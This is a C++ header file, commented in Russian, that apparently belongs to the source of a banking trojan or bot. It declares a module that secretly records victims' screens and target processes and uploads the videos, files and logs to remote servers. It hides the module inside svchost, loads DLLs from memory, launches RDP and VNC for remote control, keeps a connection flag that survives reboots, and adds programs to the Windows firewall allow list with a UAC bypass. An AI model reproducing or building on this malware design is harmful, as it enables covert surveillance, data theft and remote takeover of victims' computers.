#ifndef VideoRecorderH
#define VideoRecorderH
//-----------------------------------------------------------------------------

#include <windows.h>
#include "UniversalKeyLogger.h"
#include "DllLoader.h"
#include "Pipes.h"

//если объявлен, то видеодлл запускается в отдельном свцхосте, иначе (если закомментировать)
//будет запускаться в процессе LoaderRoutine
#define VideoProcessSvchost

// Настройки парметров для билдера
#define VIDEOREC_PARAM_SIZE_HOST 50
#define VIDEOREC_PARAM_SIZE_URLS 3000

#define VIDEOREC_PARAM_NAME_HOST1 "VIDEO_REC_HOST1"
#define VIDEOREC_PARAM_NAME_HOST2 "VIDEO_REC_HOST2"
#define VIDEOREC_PARAM_NAME_URLS  "VIDEO_REC_URLS\0"

#define VIDEOREC_PARAM_ENCRYPTED_HOST false
#define VIDEOREC_PARAM_ENCRYPTED_URLS false


// порт сервера приёма видео
const DWORD VIDEORECORD_DEFAULT_PORT = 700;



static const int VIDEO_FULLSCREEN	= 0x0001; //полноэкранная запись
static const int VIDEO_ALWAYS		= 0x0002; //записывать всегда, даже если окно не активно


//****************************************************
//  TVideoRecDLL - класс для работы с библиотекой
//                 видеозаписи
//****************************************************
class TVideoRecDLL : public TMemoryDLL
{
private:

	// определяем типы функций
	//функции инииализации и освобождения длл
	typedef DWORD (WINAPI *TInit)( const char* uid, int flags, const char* ip, int port, int downtime );
	typedef void (WINAPI *TRelease)( DWORD server );
	typedef DWORD (WINAPI *TAddIPServer)( DWORD server, const char* ip, int port );
	typedef void (WINAPI* TUpdateSettings)( DWORD server, int setFlags, int resetFlags, int downtime );

	//функции записи видео
	typedef VOID (WINAPI *TStartRecHwnd	)( DWORD server, char* uid, char* nameVideo, HWND wnd, int seconds, int flags ) ;
	typedef VOID (WINAPI *TStartRecPid  )( DWORD server, char* uid, char* nameVideo, DWORD pid, int seconds, int flags );
	typedef VOID (WINAPI *TStopRec		)();
	typedef VOID (WINAPI *TResetTime	)();

	//функции отправки файлов
	typedef VOID ( WINAPI *TStartSend	)( DWORD server, char* name, char* path, int flags, int after );
	typedef DWORD ( WINAPI *TStartSendAsync )( DWORD server, char* name, char* path, int flags, int after );
	typedef DWORD ( WINAPI *TIsSendedAsync )( DWORD );
	typedef DWORD ( WINAPI *TFolderIsUpload )( const char* name, const char* folder );
	//выход из режима сна
	typedef void ( WINAPI *TOutOfHibernation )( DWORD server );
	//функции передачи логов на сервер
	typedef void (WINAPI *TSendLog)( DWORD server, const char* name, int code, const char* text );

	//запуск потока выполнения команд сервера
public:
	typedef DWORD (WINAPI *typeCallbackCmd)( DWORD server, DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData );
private:
	typedef VOID (WINAPI *TRunCmdExec)( DWORD server, typeCallbackCmd );

	void InitializeApi();
	void LoadFunc(const char* Name, LPVOID &Addr);

public:

	static const int Hibernation = 0x0001; //запуск в режиме спячки (сразу не коннектится к серверу, а только при передачи данных)
	static const int RunCallback = 0x1000; //запуск callback функции CallbackCmd из VideoRecorder.cpp

	TVideoRecDLL();
	~TVideoRecDLL();

	TInit				Init;
	TRelease			Release;
	TUpdateSettings		UpdateSettings;
	TAddIPServer		AddIPServer;
	TStartRecHwnd		RecordWnd;
	TStartRecPid		RecordProcess;
	TStopRec			RecordStop;
	TResetTime			ResetTime;
	TStartSend			SendFiles;
	TStartSendAsync		StartSendAsync;
	TIsSendedAsync		IsSendedAsync;
	TRunCmdExec			RunCmdExec;
	TSendLog			SendLog;
	TFolderIsUpload		FolderIsUpload;
	TOutOfHibernation	OutOfHibernation;

};

namespace VideoProcess
{

//инициализирует видео длл и стартует пайп канал для приема команд на выполнение
bool Start();
//запускает Start() в отдельном свцхосте
DWORD WINAPI StartSvchost(void*);
//завершение работы видео процесса
void Stop();
//возвращает имя пайп канала для видео процесса
char* GetNamePipe( char* buf );

//функции через канал пайпа вызывают функции видео длл. Видео длл должна быть запущена
//в единственном экземпляре в отдельном процессе
int Init( int flags, const char* ip, int port, int downtime );
bool RecordHWND( int server, const char* name, HWND wnd, int seconds = 0, int flags = 0 );
bool RecordPID( int server, const char* name, DWORD pid = 0, int seconds = 0, int flags = 0 );
void RecordStop();
DWORD SendFiles( int server, const char* name, const char* path, int flags = 0, int after = 0, bool async = false );
bool FolderIsUpload( const char* name, const char* path );
bool FilesIsSended(DWORD id);
bool SendLog( int server, const char* name, int code, const char* text );
void OutOfHibernation( int server );

void UpdateSettings( int server, int setFlags, int resetFlags, int downtime );
//запуск rdp.dll
DWORD WINAPI ProcessRDP(void*);
//запуск vnc.exe
DWORD WINAPI ProcessVNC(void*);
//запуск другой версии vnc.exe
DWORD WINAPI ProcessVNC2(void*);
//соединяется с сервером, если autorun=true, то соединяется в случае наличия флага установки коннекта после ребута
//если autorun=false, то соединеятся в любом случае
void ConnectToServer( int server, bool autorun = false );
//если set=true, то устанавливает флаг коннекта после ребута
//если set=false, то снимает этот флаг
void SetAutorun( bool set );

};

//класс для упрощения отправки логов, тут запоминается имя лога, чтобы не писать его в каждой строчке
class VideoLog : public TBotObject
{
		const char* name;

	public:

		VideoLog( const char* _name ) : name(_name)
		{
		}
		void Send( int code, const char* format, ... );
		void Send2(int code, const char* text )
		{
			Send2( name, code, text );
		}

		//отправка лога на сервер:
		//name - имя лога
		//code - код лога
		//format - форматированный текст лога
		static void Send( const char* name, int code, const char* format, ... );
		static void SendV( const char* name, int code, const char* format, va_list va );
		//тоже самое что и Send только без форматирования текста
		static void Send2( const char* name, int code, const char* text )
		{
			VideoProcess::SendLog( 0, name, code, text );
		}

};

//Функция возвращает адрес сервера для записи видео
PCHAR GetVideoRecHost1();
PCHAR GetVideoRecHost2();
//запускает проброс порта, в параметрах указывается айпи видео сервера (порт сервера зашит в функции), порт который нужно 
//пробросить передаст видео сервер, эта функция запускает видео-длл и сама видео-длл ждет номер порта
//для проброса, возвращает указатель на библиотеку, чтобы удалить после использования
//TVideoRecDLL* RunPortForward( const char* ip );
//сохраняет видео-длл в указанном файле
bool SaveVideoDll( const char* nameFile );

void StartVideoFromCurrentURL();

//Преобразовывает путь в имя папки для передачи данных на видео-сервер, т. е. заменяет символы
//которые не могут быть в имени файла на _
char* PathToName( const char* path, char* name, int szName );
//добавляет указанный файл в список разрешенных браундмаузера винды
bool AddAllowedprogram( const char* pathExe );
//добавляет указанный файл в список разрешенных браундмаузера винды, только если 7-ка, то
//делается обход уака
bool AddAllowedprogramUAC( const char* pathExe );

#endif
